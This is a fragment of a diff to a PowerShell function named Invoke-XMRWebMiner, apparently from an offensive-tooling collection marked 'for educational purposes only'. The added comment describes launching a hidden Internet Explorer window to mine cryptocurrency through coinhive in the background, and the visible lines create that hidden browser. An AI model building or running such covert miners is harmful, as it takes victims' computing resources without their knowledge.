@@ -1,6 +1,7 @@
 function Invoke-XMRWebMiner {
 <#--
  FOR EDUCATIONAL PURPOSES ONLY
+ Will start a hidden Internet Explorer window and mine through coinhive in the background.
 --#>
 $ie=New-Object -comobject InternetExplorer.Application
 $ie.visible = $False
